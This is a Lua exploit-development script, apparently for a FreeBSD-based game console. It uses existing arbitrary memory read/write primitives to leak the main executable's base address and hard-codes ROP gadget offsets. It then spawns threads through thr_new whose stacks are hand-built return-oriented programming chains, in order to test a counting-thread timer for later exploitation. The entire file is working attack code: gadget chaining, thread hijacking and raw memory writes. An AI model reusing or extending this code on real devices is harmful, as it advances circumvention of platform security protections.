-- CRASH_CLASS: MODERATE
-- PROBE 1199j: Counting thread timer via thr_new(455)
--
-- thr_create(430) rejected our ucontext (-1). Use thr_new(455) instead.
-- Trick: allocate 8MB, set stack_size small, chain lives above RSP.
-- RSP = (stack_base + stack_size) & ~0xF - 8
-- start_func = bare_ret → jumps to first chain entry at RSP
-- RDI = arg delivered by thr_new
--
-- Thread A (counter): writes 1,2,3... to shared counter
-- Thread B (reader): reads counter 10 times with ROP delays
-- If reader sees increasing values → we have a native timer

print("=== PROBE 1199j: Counting thread via thr_new ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_mmap     = make_syscall(477)
local sc_thr_new  = make_syscall(455)
local sc_nanosleep = make_syscall(240)

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print(string.format("eboot: 0x%X%08X", text_hi, text_lo))

-- Gadgets
local bare_ret        = eboot + uint64(0x42)
local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)  -- mov [rdi],rax;ret
local mov_rax_rax_ret = eboot + uint64(0x1EEBB)  -- mov rax,[rax];ret

-- Shared memory
local shared = sc_mmap(uint64(0), uint64(0x4000), uint64(0x3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sh_h, sh_l = get_hi_lo(shared)
if sh_h >= 0xFFFF0000 then print("FATAL: shared mmap fail"); return end
for i = 0, 0x1000, 4 do safe_wd(shared + uint64(i), 0) end

local counter_addr = shared
local results_addr = shared + uint64(0x100)
local done_a       = shared + uint64(0x200)
local done_b       = shared + uint64(0x208)

-- ====================================================
-- Helper: allocate 8MB, set stack_size so RSP lands
-- at a known offset, chain goes above RSP
-- ====================================================
-- stack_size = 0x1000 (4KB) → RSP ≈ buf + 0x1000 - 8 = buf + 0xFF8
-- Chain starts at RSP (buf+0xFF8), extends for ~8MB-4KB
-- bare_ret as start_func pops first entry from RSP → jumps to chain

local function make_thread(arg_val, build_chain_fn)
    local buf_size = 8 * 1024 * 1024  -- 8MB
    local stk_size = 0x1000            -- 4KB nominal "stack"
    local buf = sc_mmap(uint64(0), uint64(buf_size), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local bh, bl = get_hi_lo(buf)
    if bh >= 0xFFFF0000 then return nil, "mmap failed" end

    -- RSP = (buf + stk_size) & ~0xF - 8
    -- buf is page-aligned, so buf + 0x1000 is 16-byte aligned
    -- RSP = buf + 0x1000 - 8 = buf + 0xFF8
    local rsp = buf + uint64(stk_size) - uint64(8)

    -- Build chain starting at rsp
    -- First entry: address of first gadget (popped by bare_ret)
    local chain_start = rsp
    local chain_limit = buf + uint64(buf_size)

    local bytes_used = build_chain_fn(chain_start, chain_limit)

    -- Build thr_param struct (0x38 bytes)
    local param = memory.alloc(0x38)
    safe_wq(param + 0x00, bare_ret)                -- start_func
    safe_wq(param + 0x08, uint64(arg_val or 0))    -- arg → RDI
    safe_wq(param + 0x10, buf)                      -- stack_base
    safe_wq(param + 0x18, uint64(stk_size))         -- stack_size
    safe_wq(param + 0x20, uint64(0))                -- tls_base
    safe_wq(param + 0x28, uint64(0))                -- tls_size
    safe_wq(param + 0x30, memory.alloc(8))          -- child_tid ptr

    -- Launch
    local ret
    pcall(function()
        ret = to_num(sc_thr_new(uint64(param), uint64(0x38)))
    end)

    local tid = safe_rd(param + 0x30)
    return ret, tid, bytes_used
end

-- ====================================================
-- Thread A: counter (writes 1..N to [rdi])
-- ====================================================
local COUNTER_TICKS = 50000

local function build_counter_chain(start, limit)
    local off = 0
    -- First entry: pop_rax_ret (bare_ret will jump here)
    safe_wq(start + uint64(off), pop_rax_ret)
    off = off + 8

    -- Counter loop: value, mov_rdi_rax_ret, pop_rax_ret
    for i = 1, COUNTER_TICKS do
        safe_wq(start + uint64(off), uint64(i))
        off = off + 8
        safe_wq(start + uint64(off), mov_rdi_rax_ret)
        off = off + 8
        if i < COUNTER_TICKS then
            safe_wq(start + uint64(off), pop_rax_ret)
            off = off + 8
        end
    end

    -- Set done flag: pop rdi → done_a, pop rax → 0xCAFE, mov [rdi],rax
    safe_wq(start + uint64(off), pop_rdi_ret)
    off = off + 8
    safe_wq(start + uint64(off), done_a)
    off = off + 8
    safe_wq(start + uint64(off), pop_rax_ret)
    off = off + 8
    safe_wq(start + uint64(off), uint64(0xCAFE))
    off = off + 8
    safe_wq(start + uint64(off), mov_rdi_rax_ret)
    off = off + 8

    -- End: bare_ret chain (will eventually fault — thread dies)
    for i = 1, 10 do
        safe_wq(start + uint64(off), bare_ret)
        off = off + 8
    end

    return off
end

-- ====================================================
-- Thread B: reader (reads counter 10 times with delays)
-- ====================================================
local NUM_READS = 10
local DELAY_NOPS = 200   -- ~200 NOPs between reads ≈ ~600 cycles ≈ ~170ns
local STARTUP_NOPS = 3000  -- startup delay to let counter start

local function build_reader_chain(start, limit)
    local off = 0

    -- First entry: pop_rax_ret
    safe_wq(start + uint64(off), pop_rax_ret)
    off = off + 8

    -- Startup delay: pop_rax → 0, pop_rax → 0, ...
    for i = 1, STARTUP_NOPS do
        safe_wq(start + uint64(off), uint64(0))
        off = off + 8
        safe_wq(start + uint64(off), pop_rax_ret)
        off = off + 8
    end

    -- 10 reads with delays between them
    for r = 0, NUM_READS - 1 do
        -- Read counter: pop rax → counter_addr
        safe_wq(start + uint64(off), counter_addr)
        off = off + 8
        -- mov rax,[rax] → rax = *counter
        safe_wq(start + uint64(off), mov_rax_rax_ret)
        off = off + 8
        -- Store: pop rdi → &results[r]
        safe_wq(start + uint64(off), pop_rdi_ret)
        off = off + 8
        safe_wq(start + uint64(off), results_addr + uint64(r * 8))
        off = off + 8
        -- mov [rdi],rax → store counter snapshot
        safe_wq(start + uint64(off), mov_rdi_rax_ret)
        off = off + 8

        -- Delay NOPs (except after last read)
        if r < NUM_READS - 1 then
            safe_wq(start + uint64(off), pop_rax_ret)
            off = off + 8
            for n = 1, DELAY_NOPS do
                safe_wq(start + uint64(off), uint64(0))
                off = off + 8
                safe_wq(start + uint64(off), pop_rax_ret)
                off = off + 8
            end
        end
    end

    -- Done flag
    safe_wq(start + uint64(off), pop_rdi_ret)
    off = off + 8
    safe_wq(start + uint64(off), done_b)
    off = off + 8
    safe_wq(start + uint64(off), pop_rax_ret)
    off = off + 8
    safe_wq(start + uint64(off), uint64(0xBEEF))
    off = off + 8
    safe_wq(start + uint64(off), mov_rdi_rax_ret)
    off = off + 8

    for i = 1, 10 do
        safe_wq(start + uint64(off), bare_ret)
        off = off + 8
    end

    return off
end

-- ====================================================
-- Launch both threads
-- ====================================================
print("")
print("--- Building and launching threads ---")

-- Counter thread: arg = counter_addr (delivered in RDI)
local ca_h, ca_l = get_hi_lo(counter_addr)
local counter_arg_num = ca_l  -- for uint64 construction
-- We need to pass the full 64-bit counter_addr as arg
-- thr_new delivers arg in RDI

print(string.format("Building counter chain (%d ticks)...", COUNTER_TICKS))
local ret_a, tid_a, bytes_a = make_thread(counter_addr, build_counter_chain)
print(string.format("Thread A: ret=%s tid=%s bytes=%s",
    tostring(ret_a), tostring(tid_a), tostring(bytes_a)))

print(string.format("Building reader chain (%d reads, %d delay)...",
    NUM_READS, DELAY_NOPS))
local ret_b, tid_b, bytes_b = make_thread(uint64(0), build_reader_chain)
print(string.format("Thread B: ret=%s tid=%s bytes=%s",
    tostring(ret_b), tostring(tid_b), tostring(bytes_b)))

-- ====================================================
-- Wait and collect
-- ====================================================
print("")
print("--- Waiting ---")

local sleep_ts = memory.alloc(16)
safe_wd(sleep_ts, 0)
safe_wd(sleep_ts + 4, 0)
safe_wd(sleep_ts + 8, 50000000)  -- 50ms
safe_wd(sleep_ts + 12, 0)

for wait = 1, 40 do  -- 40 x 50ms = 2s
    pcall(function() sc_nanosleep(uint64(sleep_ts), uint64(0)) end)
    local da = safe_rd(done_a)
    local db = safe_rd(done_b)
    if da and da ~= 0 and db and db ~= 0 then
        print(string.format("Both done after %dms", wait * 50))
        break
    end
    if wait == 40 then
        print(string.format("Timeout. done_a=0x%X done_b=0x%X",
            da or 0, db or 0))
        -- Read counter anyway
        local cv = safe_rd(counter_addr)
        print(string.format("Counter at timeout: %d", cv or 0))
    end
end

-- Read final counter
local cfinal = safe_rd(counter_addr)
print(string.format("Counter final: %d", cfinal or 0))

-- Read results
print("")
print("--- Reader snapshots ---")
local vals = {}
local prev = -1
local monotonic = true
for r = 0, NUM_READS - 1 do
    local rq = safe_rq(results_addr + uint64(r * 8))
    local rh, rl = get_hi_lo(rq)
    local v = rl
    if r > 0 and v <= prev then monotonic = false end
    local delta = r > 0 and (v - prev) or 0
    print(string.format("  [%d] = %d  (delta=%d)", r, v, delta))
    table.insert(vals, v)
    prev = v
end

print("")
if monotonic and vals[1] > 0 then
    print("** MONOTONIC + NONZERO — counting thread timer WORKS **")
    local avg_delta = (vals[#vals] - vals[1]) / (#vals - 1)
    print(string.format("  Avg delta per %d NOPs: %.0f counter ticks", DELAY_NOPS, avg_delta))
    print(string.format("  Each NOP ≈ 4-6 cycles, %d NOPs ≈ %d cycles", DELAY_NOPS, DELAY_NOPS * 5))
    print(string.format("  Timer resolution ≈ %.0f cycles per tick",
        DELAY_NOPS * 5 / math.max(avg_delta, 1)))
elseif vals[1] > 0 then
    print("** VALUES NONZERO BUT NOT MONOTONIC — thread timing inconsistent **")
else
    print("** ALL ZEROS — threads did not execute or counter not visible **")
end

print("")
print("=== PROBE 1199j COMPLETE ===")
